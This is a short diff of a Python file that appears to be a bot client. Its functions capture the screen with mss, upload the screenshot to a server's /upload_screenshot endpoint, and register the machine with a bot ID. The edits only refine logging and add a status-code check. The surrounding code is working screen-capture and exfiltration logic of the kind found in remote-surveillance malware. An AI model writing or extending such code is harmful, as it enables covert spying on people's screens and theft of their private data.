@@ -39,15 +39,19 @@ def take_screenshot():
     with mss.mss() as sct:
         monitor = sct.monitors[1]  # Captures the first monitor
         output = 'screen_capture.png'  # Path to store the screenshot file
-        sct_img = sct.shot(mon=monitor, output=output)
-        print(f"Screenshot saved to {output}")
+        sct.shot(mon=monitor, output=output)
+        print(f"Screenshot taken and saved to {output}")
         return output
 
 def send_screenshot(server_url, filepath):
     with open(filepath, 'rb') as f:
         files = {'file': (filepath, f)}
         response = requests.post(f"{server_url}/upload_screenshot", files=files)
-        print("Screenshot sent to server:", response.status_code)
+        if response.status_code == 200:
+            print(f"Screenshot sent to server successfully: {response.status_code}")
+        else:
+            print(f"Failed to send screenshot to server: {response.status_code}")
+
 
 def register_bot(server_url, bot_id):
     response = requests.post(f"{server_url}/register", json={"id": bot_id})
